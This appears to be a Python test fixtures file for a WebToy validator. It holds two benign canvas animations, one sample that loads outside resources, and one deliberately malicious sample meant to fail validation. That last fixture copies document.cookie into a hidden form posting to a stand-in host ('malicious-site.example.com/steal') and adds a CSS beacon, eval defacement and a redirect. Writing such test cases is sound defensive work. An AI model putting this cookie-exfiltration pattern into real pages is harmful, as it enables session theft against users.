"""
Sample WebToy fixtures for testing
"""

from typing import Dict


def bouncing_ball_webtoy() -> dict[str, str]:
    """
    A simple bouncing ball animation WebToy
    """
    return {
        "html": """
        <canvas id="canvas" width="500" height="500"></canvas>
        """,
        "css": """
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            background: #222;
        }
        
        canvas {
            display: block;
            margin: 0 auto;
            background: #000;
        }
        """,
        "js": """
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        // Ball properties
        const ball = {
            x: 250,
            y: 250,
            radius: 20,
            dx: 3,
            dy: 2,
            color: '#ff4500'
        };
        
        function draw() {
            // Clear canvas
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            
            // Draw ball
            ctx.beginPath();
            ctx.arc(ball.x, ball.y, ball.radius, 0, Math.PI * 2);
            ctx.fillStyle = ball.color;
            ctx.fill();
            ctx.closePath();
            
            // Move ball
            ball.x += ball.dx;
            ball.y += ball.dy;
            
            // Bounce off walls
            if (ball.x + ball.radius > canvas.width || ball.x - ball.radius < 0) {
                ball.dx = -ball.dx;
                ball.color = randomColor();
            }
            
            if (ball.y + ball.radius > canvas.height || ball.y - ball.radius < 0) {
                ball.dy = -ball.dy;
                ball.color = randomColor();
            }
            
            requestAnimationFrame(draw);
        }
        
        function randomColor() {
            return '#' + Math.floor(Math.random() * 16777215).toString(16);
        }
        
        // Start animation
        draw();
        """,
    }


def particle_system_webtoy() -> dict[str, str]:
    """
    A more complex particle system WebToy
    """
    return {
        "html": """
        <canvas id="canvas" width="800" height="600"></canvas>
        <div id="controls">
            <label>Particles: <span id="particleCount">100</span></label>
            <input type="range" id="particleSlider" min="10" max="500" value="100">
        </div>
        """,
        "css": """
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            background: #111;
            font-family: Arial, sans-serif;
        }
        
        canvas {
            display: block;
            margin: 0 auto;
            background: #000;
        }
        
        #controls {
            position: absolute;
            bottom: 10px;
            left: 10px;
            background: rgba(0, 0, 0, 0.5);
            padding: 10px;
            border-radius: 5px;
            color: white;
        }
        
        input[type="range"] {
            width: 100px;
            margin-left: 10px;
        }
        """,
        "js": """
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const particleSlider = document.getElementById('particleSlider');
        const particleCount = document.getElementById('particleCount');
        
        let particles = [];
        let particleNum = 100;
        
        // Initialize particles
        function initParticles() {
            particles = [];
            for (let i = 0; i < particleNum; i++) {
                particles.push({
                    x: Math.random() * canvas.width,
                    y: Math.random() * canvas.height,
                    size: Math.random() * 5 + 1,
                    color: 'hsl(' + Math.random() * 360 + ', 100%, 50%)',
                    speedX: Math.random() * 6 - 3,
                    speedY: Math.random() * 6 - 3
                });
            }
        }
        
        // Update particles
        function updateParticles() {
            for (let i = 0; i < particles.length; i++) {
                const p = particles[i];
                
                // Move
                p.x += p.speedX;
                p.y += p.speedY;
                
                // Bounce off edges
                if (p.x < 0 || p.x > canvas.width) p.speedX *= -1;
                if (p.y < 0 || p.y > canvas.height) p.speedY *= -1;
                
                // Draw
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                ctx.fillStyle = p.color;
                ctx.fill();
                
                // Draw connections
                for (let j = i + 1; j < particles.length; j++) {
                    const p2 = particles[j];
                    const dx = p.x - p2.x;
                    const dy = p.y - p2.y;
                    const distance = Math.sqrt(dx * dx + dy * dy);
                    
                    if (distance < 100) {
                        ctx.beginPath();
                        ctx.strokeStyle = 'rgba(255, 255, 255, ' + (1 - distance / 100) * 0.5 + ')';
                        ctx.lineWidth = 1;
                        ctx.moveTo(p.x, p.y);
                        ctx.lineTo(p2.x, p2.y);
                        ctx.stroke();
                    }
                }
            }
        }
        
        // Animation loop
        function animate() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            updateParticles();
            requestAnimationFrame(animate);
        }
        
        // Handle slider changes
        particleSlider.addEventListener('input', () => {
            particleNum = parseInt(particleSlider.value);
            particleCount.textContent = particleNum;
            initParticles();
        });
        
        // Initialize and start animation
        initParticles();
        animate();
        """,
    }


def invalid_webtoy_external_resources() -> dict[str, str]:
    """
    A WebToy that attempts to use external resources (should fail validation)
    """
    return {
        "html": """
        <canvas id="canvas"></canvas>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
        """,
        "css": """
        @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
        
        body {
            font-family: 'Roboto', sans-serif;
            background: url('https://example.com/bg.jpg');
        }
        """,
        "js": """
        // Attempt to load external data
        fetch('https://api.example.com/data')
            .then(response => response.json())
            .then(data => console.log(data));
            
        // Try to use window object
        window.alert('Hello');
        """,
    }


def malicious_webtoy_attempt() -> dict[str, str]:
    """
    A WebToy that attempts malicious actions (should fail validation)
    """
    return {
        "html": """
        <canvas id="canvas"></canvas>
        <iframe src="http://malicious-site.example.com"></iframe>
        <form action="http://malicious-site.example.com/steal" method="post">
            <input type="hidden" name="data" id="stolen">
        </form>
        """,
        "css": """
        body::after {
            content: url('https://malicious-site.example.com/beacon');
        }
        """,
        "js": """
        // Try to steal cookies
        document.getElementById('stolen').value = document.cookie;
        
        // Attempt XSS
        eval('document.body.innerHTML = "<h1>Hacked</h1>";');
        
        // Try to redirect
        window.location = 'https://malicious-site.example.com';
        
        // Attempt to use localStorage
        localStorage.setItem('userData', document.cookie);
        """,
    }
